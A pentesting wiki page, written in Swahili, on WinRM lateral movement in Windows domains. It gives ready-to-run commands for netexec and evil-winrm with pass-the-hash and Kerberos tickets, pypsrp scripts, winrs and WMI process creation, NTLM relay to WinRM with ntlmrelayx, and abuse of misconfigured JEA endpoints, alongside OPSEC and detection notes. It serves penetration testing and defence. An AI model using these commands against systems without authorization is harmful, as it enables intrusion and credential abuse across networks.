# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ni mojawapo ya njia rahisi zaidi za **lateral movement** katika mazingira ya Windows, kwa sababu hukupa shell ya mbali kupitia **WS-Man/HTTP(S)** bila kuhitaji mbinu za kuunda huduma za SMB. Ikiwa target inafichua **5985/5986** na principal yako inaruhusiwa kutumia remoting, mara nyingi unaweza kutoka kwenye "valid creds" hadi "interactive shell" haraka sana.

Kwa maelezo kuhusu **protocol/service enumeration**, listeners, kuwezesha WinRM, `Invoke-Command`, na matumizi ya jumla ya client, angalia:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Kwa nini operators hupenda WinRM

- Hutumia **HTTP/HTTPS** badala ya SMB/RPC, hivyo mara nyingi hufanya kazi mahali ambapo utekelezaji wa mtindo wa PsExec umezuiwa.
- Kwa **Kerberos**, huepuka kutuma credentials zinazoweza kutumika tena kwa target.
- Hufanya kazi vizuri kutoka kwa zana za **Windows**, **Linux**, na **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Njia ya interactive PowerShell remoting huzindua **`wsmprovhost.exe`** kwenye target chini ya muktadha wa mtumiaji aliyethibitishwa, jambo ambalo kiutendaji ni tofauti na exec inayotegemea huduma.

## Muundo wa ufikiaji na masharti ya awali

Kwa vitendo, mafanikio ya WinRM lateral movement hutegemea mambo **matatu**:

1. Target ina **WinRM listener** (`5985`/`5986`) na sheria za firewall zinazoruhusu ufikiaji.
2. Akaunti inaweza **kuthibitishwa** dhidi ya endpoint.
3. Akaunti inaruhusiwa **kufungua remoting session**.

Njia za kawaida za kupata ufikiaji huo:

- **Local Administrator** kwenye target.
- Uanachama katika **Remote Management Users** kwenye mifumo mipya, au **WinRMRemoteWMIUsers__** kwenye mifumo/vipengele ambavyo bado vinatambua kundi hilo.
- Haki za remoting zilizokabidhiwa wazi kupitia local security descriptors / mabadiliko ya PowerShell remoting ACL.

Ikiwa tayari unadhibiti kompyuta yenye haki za admin, kumbuka unaweza pia **kukabidhi ufikiaji wa WinRM bila uanachama kamili wa admin group** kwa kutumia mbinu zilizoelezwa hapa:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Mambo ya kuzingatia kuhusu authentication wakati wa lateral movement

- **Kerberos inahitaji hostname/FQDN**. Ukiunganisha kwa IP, client kwa kawaida hutumia **NTLM/Negotiate** badala yake.
- Katika hali za **workgroup** au mipaka ya cross-trust, NTLM kwa kawaida huhitaji **HTTPS** au target iongezwe kwenye **TrustedHosts** ya client.
- Kwa local accounts zinazotumia Negotiate katika workgroup, vizuizi vya UAC vya mbali vinaweza kuzuia ufikiaji isipokuwa utumie akaunti ya Administrator iliyojengewa ndani au `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting hutumia **`HTTP/<host>` SPN** kwa chaguo-msingi. Katika mazingira ambako `HTTP/<host>` tayari imesajiliwa kwa service account nyingine, WinRM Kerberos inaweza kushindwa kwa `0x80090322`; tumia SPN yenye port au badili hadi **`WSMAN/<host>`** pale SPN hiyo ilipo.<sup>[[3]](#references)</sup>

Ukipata credentials halali wakati wa password spraying, kuzithibitisha kupitia WinRM mara nyingi ndiyo njia ya haraka zaidi ya kuangalia kama zinaweza kukupa shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement kutoka Linux hadi Windows

### NetExec / CrackMapExec kwa uthibitishaji na utekelezaji wa amri moja wa haraka

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM kwa shells shirikishi

`evil-winrm` bado ndiyo chaguo rahisi zaidi kwa matumizi shirikishi kutoka Linux kwa sababu inasaidia **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, uhamishaji wa faili, na upakiaji wa PowerShell/.NET kwenye memory.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN hali isiyo ya kawaida: `HTTP` dhidi ya `WSMAN`

Wakati SPN chaguomsingi ya **`HTTP/<host>`** inasababisha hitilafu za Kerberos, jaribu kuomba/ kutumia tiketi ya **`WSMAN/<host>`** badala yake. Hali hii hujitokeza katika mipangilio ya enterprise iliyoimarishwa au isiyo ya kawaida ambapo `HTTP/<host>` tayari imehusishwa na akaunti nyingine ya huduma.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Hii pia ni muhimu baada ya matumizi mabaya ya **RBCD / S4U** pale unapokuwa umeforge au umeomba tiketi ya huduma ya **WSMAN** badala ya tiketi ya jumla ya `HTTP`.

### Uthibitishaji unaotegemea cheti

WinRM pia hutumia **uthibitishaji wa cheti cha mteja**, lakini cheti lazima kiunganishwe na **akaunti ya ndani** kwenye target. Kwa mtazamo wa mshambuliaji, hili ni muhimu unapokuwa:

- umeiba/ku-export cheti halali cha mteja na private key ambayo tayari imeunganishwa kwa WinRM;
- umetumia vibaya **AD CS / Pass-the-Certificate** kupata cheti cha principal kisha kuhamia kwenye njia nyingine ya uthibitishaji;
- unafanya kazi katika mazingira ambayo huepuka kimakusudi remote access inayotegemea nenosiri.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM si ya kawaida sana kuliko password/hash/Kerberos auth, lakini inapokuwepo inaweza kutoa njia ya **passwordless lateral movement** inayoendelea kufanya kazi hata baada ya password rotation.

### Python / automation with `pypsrp`

Ikiwa unahitaji automation badala ya operator shell, `pypsrp` hukupa WinRM/PSRP kutoka Python ikiwa na usaidizi wa **NTLM**, **certificate auth**, **Kerberos**, na **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Ikiwa unahitaji udhibiti wa kina zaidi kuliko ule wa wrapper ya kiwango cha juu ya `Client`, API za kiwango cha chini za `WSMan` + `RunspacePool` zinafaa kwa matatizo mawili ya kawaida ya operator:

- kulazimisha **`WSMAN`** itumike kama huduma/SPN ya Kerberos badala ya matarajio ya kawaida ya `HTTP` yanayotumiwa na clients wengi wa PowerShell;
- kuunganisha kwenye endpoint ya PSRP isiyo ya chaguomsingi, kama vile usanidi wa session wa **JEA** / maalum badala ya `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Custom PSRP endpoints na JEA ni muhimu wakati wa lateral movement

Uthibitishaji wa WinRM uliofanikiwa **haumaanishi** kila mara kwamba unaingia kwenye endpoint ya kawaida isiyo na vizuizi ya `Microsoft.PowerShell`. Mazingira yaliyokomaa yanaweza kufichua **custom session configurations** au endpoints za **JEA** zenye ACLs na tabia zao za run-as.<sup>[[1]](#references)</sup>

Ikiwa tayari una code execution kwenye host ya Windows na unataka kuelewa ni miingiliano ipi ya remoting iliyopo, orodhesha endpoints zilizosajiliwa:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Wakati endpoint yenye manufaa ipo, ilenge moja kwa moja badala ya shell chaguomsingi:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Athari za kiutendaji za mashambulizi:

- Endpoint **restricted** bado inaweza kutosha kwa lateral movement ikiwa inatoa cmdlets/functions zinazofaa kwa udhibiti wa huduma, ufikiaji wa faili, uundaji wa process, au utekelezaji wa amri za .NET / nje.
- Jukumu la **JEA lililosanidiwa vibaya** lina manufaa makubwa hasa linapowezesha amri hatari kama `Start-Process`, wildcards pana, providers zinazoweza kuandikiwa, au proxy functions maalum zinazokuwezesha kukwepa vikwazo vilivyokusudiwa.
- Endpoints zinazotumia **RunAs virtual accounts** au **gMSAs** hubadilisha security context inayotumika kwa amri unazoendesha. Hasa, endpoint inayotumia gMSA inaweza kutoa **network identity kwenye second hop**, hata kama kipindi cha kawaida cha WinRM kingekumbana na tatizo la kawaida la delegation.

Kwa endpoint maalum yenye vikwazo, kagua ruhusa zake halisi za amri na script kando: orodha fupi ya `Get-Command` pekee haithibitishi kwamba `.ps1` iliyopo haiwezi kuendeshwa. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) hudhibiti waziwazi njia za script zinazoweza kuitwa; endpoints nyingine maalum zinaweza kutumia sheria tofauti za session. Ikiwa script inayoruhusiwa inatumia `SecureString` iliyohifadhiwa kuunda credential ya host nyingine, blob iliyoundwa bila key iliyoainishwa hutumia [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), na kwa kawaida huhitaji muktadha wa mtumiaji na mashine iliyolinda data ili kuifungua. Kagua ACL ya script, ruhusa za kuiita, run-as identity, na ruhusa za credential kwenye mifumo inayofuata kabla ya kuchukulia source inayoweza kuandikiwa au blob iliyonakiliwa kuwa njia ya kupata mamlaka zaidi kwenye host nyingine. Usichapishe thamani iliyolindwa wakati wa enumeration isiyobadilisha mfumo.

Kwa custom function ya JEA inayopokea njia ya faili, kagua ACL ya endpoint iliyosajiliwa, role capability iliyounganishwa nayo, na run-as identity halisi kwa pamoja. Mpigaji anaweza kuwa na `NoLanguage` huku function body ikiendeshwa katika language mode chaguomsingi ya mfumo; virtual account pia inaweza kuwa na haki za local administrator. Ikiwa function hukagua directory inayoruhusiwa kwa kutumia string prefix ghafi na kisha kusoma njia iliyotolewa, vipengele vya `..` vinaweza kuelekeza nje ya directory hiyo. Kikomo ni njia halisi iliyotatuliwa chini ya identity ya function, si language mode ya mpigaji wala prefix inayoonekana. Thibitisha function inayoweza kufikiwa na ukaguzi wa final-path kabla ya kuchukulia faili ya `.psrc` au `.pssc` inayosomeka kuwa ugunduzi wa usomaji wa faili zenye upendeleo. Tazama mwongozo wa Microsoft kuhusu [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) na [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement ya WinRM inayotumia vipengele asilia vya Windows

### `winrs.exe`

`winrs.exe` imejengewa ndani na ni muhimu unapotaka **utekelezaji wa amri asilia wa WinRM** bila kufungua session ya mawasiliano ya mbali ya PowerShell:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Alama mbili ni rahisi kusahau, lakini zina umuhimu katika matumizi ya vitendo:

- `/noprofile` huhitajika mara nyingi wakati principal ya mbali **si** msimamizi wa ndani.
- `/allowdelegate` huwezesha remote shell kutumia credentials zako kufikia **host ya tatu** (kwa mfano, wakati amri inahitaji `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Kiutendaji, `winrs.exe` kwa kawaida husababisha msururu wa michakato ya mbali unaofanana na:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Hili linafaa kukumbukwa kwa sababu linatofautiana na exec inayotegemea service na vipindi shirikishi vya PSRP.

### `winrm.cmd` / WS-Man COM badala ya PowerShell remoting

Unaweza pia kutekeleza kupitia **WinRM transport** bila kutumia `Enter-PSSession` kwa kuomba madarasa ya WMI kupitia WS-Man. Hii hudumisha transport kama WinRM huku primitive ya utekelezaji wa mbali ikiwa **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Mbinu hiyo ni muhimu wakati:

- Ufuatiliaji wa logging ya PowerShell ni mkali.
- Unataka **WinRM transport** lakini si workflow ya kawaida ya PS remoting.
- Unaunda au unatumia tooling maalum inayotumia COM object ya **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Wakati SMB relay imezuiwa na signing na LDAP relay ina vizuizi, **WS-Man/WinRM** bado inaweza kuwa lengo la relay linalovutia. `ntlmrelayx.py` ya kisasa inajumuisha **WinRM relay servers** na inaweza kufanya relay kwa malengo ya **`wsman://`** au **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Vidokezo viwili vya vitendo:

- Relay huwa na manufaa zaidi ikiwa target inakubali **NTLM** na principal anayefanyiwa relay anaruhusiwa kutumia WinRM.
- Msimbo wa hivi karibuni wa Impacket hushughulikia mahususi maombi ya **`WSMANIDENTIFY: unauthenticated`**, ili uchunguzi wa aina ya `Test-WSMan` usivuruge mtiririko wa relay.

Kwa vizuizi vya multi-hop baada ya kupata session ya kwanza ya WinRM, angalia:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC na maelezo ya utambuzi

- **Interactive PowerShell remoting** kwa kawaida huunda **`wsmprovhost.exe`** kwenye target.
- **`winrs.exe`** kwa kawaida huunda **`winrshost.exe`** kisha mchakato mtoto ulioombwa.
- Endpoints maalum za **JEA** zinaweza kutekeleza vitendo kama akaunti pepe za **`WinRM_VA_*`** au kama **gMSA** iliyosanidiwa; hili hubadilisha telemetry na tabia ya second-hop ikilinganishwa na shell ya kawaida ya user-context.<sup>[[1]](#references)</sup>
- Tarajia telemetry ya **network logon**, matukio ya huduma ya WinRM, na logging ya PowerShell operational/script-block ukitumia PSRP badala ya `cmd.exe` ya moja kwa moja.
- Ikiwa unahitaji amri moja tu, `winrs.exe` au utekelezaji wa WinRM wa mara moja unaweza kuwa tulivu zaidi kuliko session ya remoting ya mwingiliano inayodumu kwa muda mrefu.
- Ikiwa Kerberos inapatikana, pendelea **FQDN + Kerberos** badala ya IP + NTLM ili kupunguza matatizo ya trust na mabadiliko yasiyofaa ya `TrustedHosts` upande wa client.

## References

- [1] [Microsoft: Masuala ya Usalama ya JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Hitilafu `0x80090322` wakati wa kuunganisha PowerShell kwenye seva ya mbali kupitia WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
